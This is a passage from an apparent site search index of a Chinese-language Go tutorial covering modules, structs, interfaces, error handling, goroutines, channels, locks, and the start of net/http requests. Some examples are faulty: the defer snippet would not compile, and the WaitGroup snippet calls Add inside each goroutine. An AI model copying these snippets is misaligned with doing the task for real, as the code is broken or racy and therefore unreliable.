mod\u65f6\u5f15\u5165\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u5305\u4e0d\u80fd\u518d\u4f7f\u7528 ./package, \u800c\u662f\u4f7f\u7528 project/package # \u5e38\u7528\u7684go mod\u547d\u4ee4 go mod tidy # \u81ea\u52a8\u5b89\u88c5\u6240\u7f3a\u7684\u4f9d\u8d56\u5305\u4ee5\u53ca\u53bb\u9664\u65e0\u7528\u7684\u4f9d\u8d56\u5305 go \u53d8\u91cf\u4e0e\u5e38\u91cf # \u76f8\u5173\u6587\u7ae0 Go\u4e94\u79cd\u5b9a\u4e49\u53d8\u91cf\u7684\u65b9\u6cd5 \u5728\u51fd\u6570\u4e4b\u5916\u4e0d\u80fd\u4f7f\u7528 a := value \u7684\u8bed\u53e5\u5b9a\u4e49\u53d8\u91cf \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf var ( WG sync . WaitGroup LOCK sync . Mutex ) \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5e38\u91cf const ( PI float64 = 3.14 WEIGHT int = 5 ) go \u7ed3\u6784\u4f53 # \u76f8\u5173\u6587\u7ae0 Go Struct \u8d85\u8be6\u7ec6\u8bb2\u89e3 \u7279\u522b\u6ce8\u610f\u7684\u662fgo\u7ed3\u6784\u4f53\u4e2d\u7684\u533f\u540d\u5b57\u6bb5,\u770b\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5 // \u5199\u6cd5\u4e00 package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion Animal // Lion\u662fAnimal\u7684\u522b\u540d,\u8fd9\u6837\u53ea\u80fd\u7ee7\u627fAnimal\u7684\u5c5e\u6027,\u800c\u65e0\u6cd5\u8c03\u7528Animal\u7684\u65b9\u6cd5,\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u63a5\u53e3/\u5b9e\u73b0func (a *Lion) Run() func main () { var lion = Lion { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , } // \u65e0\u6cd5\u8c03\u7528lion.Run() fmt . Println ( lion . Name ) } // \u5199\u6cd5\u4e8c package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion struct { Animal //\u533f\u540d\u5b57\u6bb5,\u8fd9\u6837\u7ec4\u5408\u4e86Animal\u7684\u7279\u6027,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528func (a *Animal) Run() } func main () { var lion = Lion { Animal { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , }, } lion . Run () fmt . Println ( lion . Name ) } go \u63a5\u53e3 # \u76f8\u5173\u6587\u7ae0 Go\u8bed\u8a00\u7684\u63a5\u53e3interface,struct\u7684\u7ec4\u5408\u4e0e\u7ee7\u627f go\u4e2d\u5b9a\u4e49\u63a5\u53e3\u4f7f\u7528type\u548cinterface\u5173\u952e\u5b57 \u5728Go\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2ainterface\u7c7b\u578b\uff0c\u8be5\u7c7b\u578b\u8bf4\u660e\u4e86\u5b83\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u5728\u5176\u4ed6\u7684\u51fd\u6570\u4e2d\uff0c\u5c06\u8be5interface\u7c7b\u578b\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u53c2\uff0c\u4efb\u610f\u4e00\u4e2a\u5b9e\u73b0\u4e86interface\u7c7b\u578b\u7684\u5b9e\u53c2\u90fd\u80fd\u4f5c\u4e3a\u8be5interface\u7684\u5b9e\u4f8b\u5bf9\u8c61 \u793a\u4f8b\u5982\u4e0b package main import \"fmt\" type Animal interface { Say () } type Dog struct { age int } func ( a * Dog ) Say () { fmt . Println ( \"Dog say: I am \" , a . age ) } type Cat struct { age int } func ( a * Cat ) Say () { fmt . Println ( \"Cat say: I am \" , a . age ) } func AnimalSay ( a Animal ) { a . Say () } func main () { dog := Dog { age : 2 } cat := Cat { age : 3 } AnimalSay ( & dog ) AnimalSay ( & cat ) } go \u5f02\u5e38\u5904\u7406 # \u76f8\u5173\u6587\u7ae0: Golang\u5f02\u5e38\u5904\u7406\u673a\u5236 Golang\u9519\u8bef\u548c\u5f02\u5e38\u5904\u7406\u7684\u6b63\u786e\u59ff\u52bf go\u4e2d\u4f7f\u7528 defer, error, panic, recover \u5904\u7406\u5f02\u5e38 defer defer\u5173\u952e\u5b57\u7528\u6765\u6807\u8bb0\u6700\u540e\u6267\u884c\u7684Go\u8bed\u53e5\uff0c\u4e00\u822c\u7528\u5728\u8d44\u6e90\u91ca\u653e\u3001\u5173\u95ed\u8fde\u63a5\u7b49\u64cd\u4f5c\uff0c\u4f1a\u5728\u51fd\u6570\u5173\u95ed\u524d\u8c03\u7528\u3002 \u591a\u4e2adefer\u7684\u5b9a\u4e49\u4e0e\u6267\u884c\u7c7b\u4f3c\u4e8e\u6808\u7684\u64cd\u4f5c\uff1a\u5148\u8fdb\u540e\u51fa\uff0c\u6700\u5148\u5b9a\u4e49\u7684\u6700\u540e\u6267\u884c\u3002 import ( \"net\" \"fmt\" ) func func () { conn , err := net . Dial ( \"tcp\" , \"127.0.0.1:8080\" ) defer conn . close () if err != nil { fmt . Println ( \"Connect Error:\" , err ) } else { fmt . Println ( \"Connect OK.\" ) } } error error\u7684\u63a5\u53e3\u5982\u4e0b type error interface { Error () string } \u4e00\u822c\u6211\u4eec\u4f7f\u7528errors.New()\u6216fmt.Errorf()\u6765\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u4fe1\u606f \u5047\u5982error\u6bd4\u8f83\u590d\u6742\u9700\u8981\u81ea\u5b9a\u4e49,\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u5e76\u4e14\u5b9e\u73b0\u5bf9\u5e94\u65b9\u6cd5\u6765\u81ea\u5b9a\u4e49\u9519\u8bef package main import ( \"fmt\" \"strconv\" ) type TestError struct { ErrorCode int } func ( err * TestError ) Error () string { return \"TestError: error code \" + strconv . Itoa ( err . ErrorCode ) } func Test () error { return & TestError { ErrorCode : 1 , } } func main () { err := Test () if err != nil { fmt . Println ( err ) fmt . Println ( \"Golang custom error is easy!\" ) } } panic\u548crecover panic\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u7c7b\u4f3c\u4e8epython\u4e2d\u7684raise, \u7528\u4e8e\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38, panic\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61 \u5f53\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38\u6216\u8005\u9047\u5230runt-ime panics\u65f6\u4ee3\u7801\u5c06\u4f1a\u7ec8\u6b62\u6267\u884c,\u7136\u540e\u6309\u7167FILO\u7684\u89c4\u5219\u6267\u884cdefer\u51fd\u6570 recover\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u53ea\u80fd\u5728defer\u51fd\u6570\u4e2d\u88ab\u8c03\u7528,\u7528\u4e8e\u63a5\u6536panic \u51fd\u6570\u7684\u53c2\u6570\u4fe1\u606f \u5982\u679c\u5728 defer \u8bed\u53e5\u4e2d\u4e5f\u8c03\u7528 panic \u51fd\u6570\uff0c\u5219\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u88ab\u8c03\u7528\u7684 panic \u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab recover \u51fd\u6570\u83b7\u53d6\u5230\u3002\u5982\u679c goroutine \u6ca1\u6709 panic\uff0c\u90a3\u8c03\u7528 recover \u51fd\u6570\u4f1a\u8fd4\u56de nil package main import ( \"fmt\" ) func Test () { defer func () { if r := recover (); r != nil { fmt . Println ( \"Panic info is:\" , r ) } }() panic ( \"Oh no panic!\" ) } func main () { Test () } go \u5e76\u53d1\u4e0e\u4fe1\u9053 # \u5e76\u53d1 golang\u4e2d\u4f7f\u7528go\u5173\u952e\u5b57\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b(goroutine) \u534f\u7a0b\u9ed8\u8ba4\u662f\u5355\u6838\u5e76\u53d1\u7684,\u53ef\u4ee5\u901a\u8fc7 runtime.GOMAXPROCS(cpuNum) \u6765\u4f7f\u5176\u591a\u6838\u5e76\u884c \u5b50\u534f\u7a0b\u4f1a\u5728\u4e3b\u534f\u7a0b\u9000\u51fa\u65f6\u9000\u51fa \u793a\u4f8b\u5982\u4e0b package main import ( \"os\" \"time\" ) func test () { for { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) } } func main () { go test () time . Sleep ( 3 * time . Second ) } \u4fe1\u9053 \u76f8\u5173\u6587\u7ae0 \u8be6\u89e3Go\u4fe1\u9053 golang\u4e2d\u4f7f\u7528chan\u6765\u58f0\u660e\u4e00\u4e2a\u4fe1\u9053 \u4fe1\u9053\u6709\u5bb9\u91cf\u548c\u957f\u5ea6\u4e4b\u5206,\u6709\u7f13\u5b58\u4e0e\u65e0\u7f13\u5b58\u4e4b\u5206,\u6709\u53cc\u5411\u4e0e\u5355\u5411\u4e4b\u5206 \u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\u505a\u9501, \u793a\u4f8b\u5982\u4e0b package main import ( \"fmt\" \"os\" \"time\" ) func test ( ch chan <- bool ) { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) ch <- true } func main () { ch := make ( chan bool ) go test ( ch ) <- ch fmt . Println ( \"finish\" ) } go \u9501\u4e0eWaitGroup # go\u4e2d\u5b58\u5728\u6807\u51c6\u5e93sync \u9501\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2a\u9501 var lock sync . Mutex // \u4f7f\u7528\u9501 func test () { lock . Lock () defer lock . Unlock () // do something } // \u6ce8\u610f\u4e0d\u8981\u5728\u9501\u5df2Lock\u7684\u65f6\u5019\u518d\u6b21\u8bf7\u6c42\u9501,\u4f1a\u9020\u6210\u6b7b\u9501\u5e76\u4e14\u4e0d\u4f1a\u5f15\u53d1panic WaitGroup\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2aWaitGroup var wg sync . WaitGroup // \u4f7f\u7528WaitGroup\u4f18\u96c5\u5730\u7b49\u5f85\u5b50\u534f\u7a0b\u7ed3\u675f package main import ( \"fmt\" \"sync\" ) var wg sync . WaitGroup func test ( i int ) { wg . Add ( 1 ) defer wg . Done () fmt . Println ( \"here is \" , i , \"goroutine\" ) } func main () { for i := 0 ; i < 10 ; i ++ { go test ( i ) } wg . Wait () fmt . Println ( \"Done\" ) }","title":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#\u7b2c\u4e00\u7ae0-golang\u57fa\u7840","text":"","title":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#\u73af\u5883\u642d\u5efa","text":"\u76f8\u5173\u6587\u7ae0: vscode\u642d\u5efago\u8bed\u8a00\u5f00\u53d1\u73af\u5883","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-build","text":"\u5c06go\u6587\u4ef6\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6 go build hello.go \u53bb\u9664\u8c03\u8bd5\u4fe1\u606f\u548c\u7b26\u53f7\u8868\u4ee5\u8282\u7ea6\u53ef\u6267\u884c\u6587\u4ef6\u5927\u5c0f go build -ldflags \"-w -s\" \u4ea4\u53c9\u7f16\u8bd1(\u5982\u4f7f\u7528windows\u7f16\u8bd1\u6210linux\u7684\u53ef\u6267\u884c\u6587\u4ef6) SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build -ldflags \"-s -w\" -o hello hello.go","title":"go build"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-doc","text":"\u76f8\u5173\u6587\u7ae0: godoc \u547d\u4ee4\u548c golang \u4ee3\u7801\u6587\u6863\u7ba1\u7406 # \u67e5\u770b\u76ee\u6807\u5305\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] # \u67e5\u770b\u76ee\u6807\u5305\u7684\u67d0\u5185\u5bb9\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] . [ \u51fd\u6570\u540d ] # \u6216\u8005\u7a7a\u683c\u9694\u5f00\u4e5f\u663e\u793a\u67d0\u5185\u5bb9\u7684\u6587\u6863 go doc [ targetPackage ] [ \u51fd\u6570\u540d ] # \u5b50\u5305\u7684\u6587\u6863\u6ce8\u91ca go doc [ targetPackage ] / [ subpackage ] # \u4ee3\u7801\u6587\u6863\u7f16\u5199, \u6309 go \u7684\u6807\u51c6\u6ce8\u91ca\u5199\u6cd5\u7f16\u5199 // Biz implements a business type Biz struct { } // business initialization func ( b *Biz ) Init () { }","title":"go doc"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-modgolang-v111\u53ca\u4ee5\u4e0a","text":"\u76f8\u5173\u6587\u7ae0: go mod \u4f7f\u7528 # \u914d\u7f6e go mod export GO111MODULE = true # \u521b\u5efa\u65b0\u9879\u76ee go mod init hello # \u63a5\u4e0b\u6765\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u7528\u7ba1\u4e86,\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305\u65f6import, \u5728\u8fd0\u884c\u65f6\u4f1a\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4f9d\u8d56 # go module \u5b89\u88c5 package \u7684\u539f\u5247\u662f\u5148\u62c9\u6700\u65b0\u7684 release tag\uff0c\u82e5\u65e0tag\u5219\u62c9\u6700\u65b0\u7684commit # \u4f7f\u7528go get\u65f6\u4e5f\u4f1a\u7531go mod\u63a5\u7ba1 # \u8fd0\u884c go get -u \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u6b21\u8981\u7248\u672c\u6216\u8005\u4fee\u8ba2\u7248\u672c(x.y.z, z\u662f\u4fee\u8ba2\u7248\u672c\u53f7\uff0c y\u662f\u6b21\u8981\u7248\u672c\u53f7) # \u8fd0\u884c go get -u=patch \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u4fee\u8ba2\u7248\u672c # \u8fd0\u884c go get package@version \u5c06\u4f1a\u5347\u7ea7\u5230\u6307\u5b9a\u7684\u7248\u672c\u53f7version # \u8fd0\u884cgo get\u5982\u679c\u6709\u7248\u672c\u7684\u66f4\u6539\uff0c\u90a3\u4e48go.mod\u6587\u4ef6\u4e5f\u4f1a\u66f4\u6539 # \u4f7f\u7528go mod\u65f6\u5f15\u5165\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u5305\u4e0d\u80fd\u518d\u4f7f\u7528 ./package, \u800c\u662f\u4f7f\u7528 project/package # \u5e38\u7528\u7684go mod\u547d\u4ee4 go mod tidy # \u81ea\u52a8\u5b89\u88c5\u6240\u7f3a\u7684\u4f9d\u8d56\u5305\u4ee5\u53ca\u53bb\u9664\u65e0\u7528\u7684\u4f9d\u8d56\u5305","title":"go mod(golang v1.11\u53ca\u4ee5\u4e0a)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u53d8\u91cf\u4e0e\u5e38\u91cf","text":"\u76f8\u5173\u6587\u7ae0 Go\u4e94\u79cd\u5b9a\u4e49\u53d8\u91cf\u7684\u65b9\u6cd5 \u5728\u51fd\u6570\u4e4b\u5916\u4e0d\u80fd\u4f7f\u7528 a := value \u7684\u8bed\u53e5\u5b9a\u4e49\u53d8\u91cf \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf var ( WG sync . WaitGroup LOCK sync . Mutex ) \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5e38\u91cf const ( PI float64 = 3.14 WEIGHT int = 5 )","title":"go \u53d8\u91cf\u4e0e\u5e38\u91cf"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u7ed3\u6784\u4f53","text":"\u76f8\u5173\u6587\u7ae0 Go Struct \u8d85\u8be6\u7ec6\u8bb2\u89e3 \u7279\u522b\u6ce8\u610f\u7684\u662fgo\u7ed3\u6784\u4f53\u4e2d\u7684\u533f\u540d\u5b57\u6bb5,\u770b\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5 // \u5199\u6cd5\u4e00 package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion Animal // Lion\u662fAnimal\u7684\u522b\u540d,\u8fd9\u6837\u53ea\u80fd\u7ee7\u627fAnimal\u7684\u5c5e\u6027,\u800c\u65e0\u6cd5\u8c03\u7528Animal\u7684\u65b9\u6cd5,\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u63a5\u53e3/\u5b9e\u73b0func (a *Lion) Run() func main () { var lion = Lion { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , } // \u65e0\u6cd5\u8c03\u7528lion.Run() fmt . Println ( lion . Name ) } // \u5199\u6cd5\u4e8c package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion struct { Animal //\u533f\u540d\u5b57\u6bb5,\u8fd9\u6837\u7ec4\u5408\u4e86Animal\u7684\u7279\u6027,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528func (a *Animal) Run() } func main () { var lion = Lion { Animal { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , }, } lion . Run () fmt . Println ( lion . Name ) }","title":"go \u7ed3\u6784\u4f53"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u63a5\u53e3","text":"\u76f8\u5173\u6587\u7ae0 Go\u8bed\u8a00\u7684\u63a5\u53e3interface,struct\u7684\u7ec4\u5408\u4e0e\u7ee7\u627f go\u4e2d\u5b9a\u4e49\u63a5\u53e3\u4f7f\u7528type\u548cinterface\u5173\u952e\u5b57 \u5728Go\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2ainterface\u7c7b\u578b\uff0c\u8be5\u7c7b\u578b\u8bf4\u660e\u4e86\u5b83\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u5728\u5176\u4ed6\u7684\u51fd\u6570\u4e2d\uff0c\u5c06\u8be5interface\u7c7b\u578b\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u53c2\uff0c\u4efb\u610f\u4e00\u4e2a\u5b9e\u73b0\u4e86interface\u7c7b\u578b\u7684\u5b9e\u53c2\u90fd\u80fd\u4f5c\u4e3a\u8be5interface\u7684\u5b9e\u4f8b\u5bf9\u8c61 \u793a\u4f8b\u5982\u4e0b package main import \"fmt\" type Animal interface { Say () } type Dog struct { age int } func ( a * Dog ) Say () { fmt . Println ( \"Dog say: I am \" , a . age ) } type Cat struct { age int } func ( a * Cat ) Say () { fmt . Println ( \"Cat say: I am \" , a . age ) } func AnimalSay ( a Animal ) { a . Say () } func main () { dog := Dog { age : 2 } cat := Cat { age : 3 } AnimalSay ( & dog ) AnimalSay ( & cat ) }","title":"go \u63a5\u53e3"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u5f02\u5e38\u5904\u7406","text":"\u76f8\u5173\u6587\u7ae0: Golang\u5f02\u5e38\u5904\u7406\u673a\u5236 Golang\u9519\u8bef\u548c\u5f02\u5e38\u5904\u7406\u7684\u6b63\u786e\u59ff\u52bf go\u4e2d\u4f7f\u7528 defer, error, panic, recover \u5904\u7406\u5f02\u5e38 defer defer\u5173\u952e\u5b57\u7528\u6765\u6807\u8bb0\u6700\u540e\u6267\u884c\u7684Go\u8bed\u53e5\uff0c\u4e00\u822c\u7528\u5728\u8d44\u6e90\u91ca\u653e\u3001\u5173\u95ed\u8fde\u63a5\u7b49\u64cd\u4f5c\uff0c\u4f1a\u5728\u51fd\u6570\u5173\u95ed\u524d\u8c03\u7528\u3002 \u591a\u4e2adefer\u7684\u5b9a\u4e49\u4e0e\u6267\u884c\u7c7b\u4f3c\u4e8e\u6808\u7684\u64cd\u4f5c\uff1a\u5148\u8fdb\u540e\u51fa\uff0c\u6700\u5148\u5b9a\u4e49\u7684\u6700\u540e\u6267\u884c\u3002 import ( \"net\" \"fmt\" ) func func () { conn , err := net . Dial ( \"tcp\" , \"127.0.0.1:8080\" ) defer conn . close () if err != nil { fmt . Println ( \"Connect Error:\" , err ) } else { fmt . Println ( \"Connect OK.\" ) } } error error\u7684\u63a5\u53e3\u5982\u4e0b type error interface { Error () string } \u4e00\u822c\u6211\u4eec\u4f7f\u7528errors.New()\u6216fmt.Errorf()\u6765\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u4fe1\u606f \u5047\u5982error\u6bd4\u8f83\u590d\u6742\u9700\u8981\u81ea\u5b9a\u4e49,\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u5e76\u4e14\u5b9e\u73b0\u5bf9\u5e94\u65b9\u6cd5\u6765\u81ea\u5b9a\u4e49\u9519\u8bef package main import ( \"fmt\" \"strconv\" ) type TestError struct { ErrorCode int } func ( err * TestError ) Error () string { return \"TestError: error code \" + strconv . Itoa ( err . ErrorCode ) } func Test () error { return & TestError { ErrorCode : 1 , } } func main () { err := Test () if err != nil { fmt . Println ( err ) fmt . Println ( \"Golang custom error is easy!\" ) } } panic\u548crecover panic\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u7c7b\u4f3c\u4e8epython\u4e2d\u7684raise, \u7528\u4e8e\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38, panic\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61 \u5f53\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38\u6216\u8005\u9047\u5230runt-ime panics\u65f6\u4ee3\u7801\u5c06\u4f1a\u7ec8\u6b62\u6267\u884c,\u7136\u540e\u6309\u7167FILO\u7684\u89c4\u5219\u6267\u884cdefer\u51fd\u6570 recover\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u53ea\u80fd\u5728defer\u51fd\u6570\u4e2d\u88ab\u8c03\u7528,\u7528\u4e8e\u63a5\u6536panic \u51fd\u6570\u7684\u53c2\u6570\u4fe1\u606f \u5982\u679c\u5728 defer \u8bed\u53e5\u4e2d\u4e5f\u8c03\u7528 panic \u51fd\u6570\uff0c\u5219\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u88ab\u8c03\u7528\u7684 panic \u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab recover \u51fd\u6570\u83b7\u53d6\u5230\u3002\u5982\u679c goroutine \u6ca1\u6709 panic\uff0c\u90a3\u8c03\u7528 recover \u51fd\u6570\u4f1a\u8fd4\u56de nil package main import ( \"fmt\" ) func Test () { defer func () { if r := recover (); r != nil { fmt . Println ( \"Panic info is:\" , r ) } }() panic ( \"Oh no panic!\" ) } func main () { Test () }","title":"go \u5f02\u5e38\u5904\u7406"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u5e76\u53d1\u4e0e\u4fe1\u9053","text":"\u5e76\u53d1 golang\u4e2d\u4f7f\u7528go\u5173\u952e\u5b57\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b(goroutine) \u534f\u7a0b\u9ed8\u8ba4\u662f\u5355\u6838\u5e76\u53d1\u7684,\u53ef\u4ee5\u901a\u8fc7 runtime.GOMAXPROCS(cpuNum) \u6765\u4f7f\u5176\u591a\u6838\u5e76\u884c \u5b50\u534f\u7a0b\u4f1a\u5728\u4e3b\u534f\u7a0b\u9000\u51fa\u65f6\u9000\u51fa \u793a\u4f8b\u5982\u4e0b package main import ( \"os\" \"time\" ) func test () { for { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) } } func main () { go test () time . Sleep ( 3 * time . Second ) } \u4fe1\u9053 \u76f8\u5173\u6587\u7ae0 \u8be6\u89e3Go\u4fe1\u9053 golang\u4e2d\u4f7f\u7528chan\u6765\u58f0\u660e\u4e00\u4e2a\u4fe1\u9053 \u4fe1\u9053\u6709\u5bb9\u91cf\u548c\u957f\u5ea6\u4e4b\u5206,\u6709\u7f13\u5b58\u4e0e\u65e0\u7f13\u5b58\u4e4b\u5206,\u6709\u53cc\u5411\u4e0e\u5355\u5411\u4e4b\u5206 \u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\u505a\u9501, \u793a\u4f8b\u5982\u4e0b package main import ( \"fmt\" \"os\" \"time\" ) func test ( ch chan <- bool ) { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) ch <- true } func main () { ch := make ( chan bool ) go test ( ch ) <- ch fmt . Println ( \"finish\" ) }","title":"go \u5e76\u53d1\u4e0e\u4fe1\u9053"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u9501\u4e0ewaitgroup","text":"go\u4e2d\u5b58\u5728\u6807\u51c6\u5e93sync \u9501\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2a\u9501 var lock sync . Mutex // \u4f7f\u7528\u9501 func test () { lock . Lock () defer lock . Unlock () // do something } // \u6ce8\u610f\u4e0d\u8981\u5728\u9501\u5df2Lock\u7684\u65f6\u5019\u518d\u6b21\u8bf7\u6c42\u9501,\u4f1a\u9020\u6210\u6b7b\u9501\u5e76\u4e14\u4e0d\u4f1a\u5f15\u53d1panic WaitGroup\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2aWaitGroup var wg sync . WaitGroup // \u4f7f\u7528WaitGroup\u4f18\u96c5\u5730\u7b49\u5f85\u5b50\u534f\u7a0b\u7ed3\u675f package main import ( \"fmt\" \"sync\" ) var wg sync . WaitGroup func test ( i int ) { wg . Add ( 1 ) defer wg . Done () fmt . Println ( \"here is \" , i , \"goroutine\" ) } func main () { for i := 0 ; i < 10 ; i ++ { go test ( i ) } wg . Wait () fmt . Println ( \"Done\" ) }","title":"go \u9501\u4e0eWaitGroup"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/","tags":["golang"],"text":"\u7b2c\u4e09\u7ae0-HTTP # \u4e86\u89e3net/http\u5305 # \u6709\u4ee5\u4e0b\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570 Get(url string) (resp *Response, err error) Head(url string) (resp *Response, err error) Post(url string, bodyType string, body io.Reader) (resp *Response, err error) PostForm(url string, data url.Values) (resp *Response, err error) \u7b80\u5355\u5730\u53d1\u9001GET/POST\u8bf7\u6c42 package main import ( \"fmt\" \"io/ioutil\" \"log\" \"net/http\" \"net/url\" \"strings\" ) func main () { r1 , err := http . Get ( \"http://httpbin.org/get?a=1\" ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r1 . Body . Close () body , err := ioutil . ReadAll ( r1 . Body ) if err != nil { log . Fatalln ( \"Error: \" , err ) } fmt . Println ( string ( body )) form := url . Values {} form . Add ( \"foo\" , \"bar\" ) r2 , err := http . Post ( \"http://httpbin.org/post\" , \"application/x-www-form-urlencoded\" , strings . NewReader ( form . Encode ()), ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r2 . Body . Close () r3 , err := http . PostForm ( \"http://httpbin.org/post\" , form , ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r3 . Body . Close () } \u901a\u8fc7NewReuqest/Client\u62d3\u5c55\u8bf7\u6c42 # NewRequest\u5b9a\u4e49\u4e3a: NewRequest(umethod, vurl string, wbody io.Reader) (req *Request, err error) 